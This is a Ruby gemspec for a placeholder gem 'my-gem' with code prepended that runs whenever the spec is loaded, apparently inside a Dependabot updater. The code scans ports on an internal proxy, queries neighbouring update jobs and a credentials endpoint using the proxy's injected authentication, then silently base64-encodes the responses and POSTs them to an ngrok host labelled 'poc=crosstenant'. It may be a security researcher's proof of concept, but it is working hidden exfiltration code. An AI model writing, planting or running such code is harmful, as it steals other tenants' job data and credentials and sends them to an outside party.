COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"
  require "json"

  results = []

  # Huidige job ID lezen
  job_id = nil
  begin
    job = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
    job_id = ENV["DEPENDABOT_JOB_ID"]
    results << "=== CURRENT JOB ID: #{job_id} ==="
  rescue => e
    job_id = ENV["DEPENDABOT_JOB_ID"]
    results << "=== JOB ID FROM ENV: #{job_id} ==="
  end

  # Proxy poorten scannen (admin interface?)
  [1080, 8080, 8443, 9090, 9091, 2019, 6060, 4040].each do |port|
    begin
      s = TCPSocket.new("172.19.0.2", port)
      s.close
      results << "=== PROXY 172.19.0.2:#{port} OPEN ==="
    rescue Errno::ECONNREFUSED
      results << "=== PROXY 172.19.0.2:#{port} REFUSED ==="
    rescue => e
      results << "=== PROXY 172.19.0.2:#{port} #{e.class} ==="
    end
  end

  # Enumerate aangrenzende job IDs op de Dependabot API
  # Proxy injecteert auth automatisch voor dependabot-actions.githubapp.com
  if job_id
    base_id = job_id.to_i
    (-3..3).each do |offset|
      target_id = base_id + offset
      next if target_id == base_id
      begin
        uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{target_id}")
        resp = Net::HTTP.get_response(uri)
        results << "=== GET /update_jobs/#{target_id} (offset #{offset}) HTTP #{resp.code} ===\n#{resp.body[0..1000]}"
      rescue => e
        results << "=== GET /update_jobs/#{target_id} ERR: #{e.class}: #{e.message} ==="
      end
    end

    # Probeer huidige job details + listing endpoints
    ["", "/update_jobs", "/update_jobs/#{job_id}", "/update_jobs/#{job_id}/credentials"].each do |path|
      begin
        uri = URI("https://dependabot-actions.githubapp.com#{path}")
        resp = Net::HTTP.get_response(uri)
        results << "=== GET #{path} HTTP #{resp.code} ===\n#{resp.body[0..2000]}"
      rescue => e
        results << "=== GET #{path} ERR: #{e.class}: #{e.message} ==="
      end
    end
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=crosstenant")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
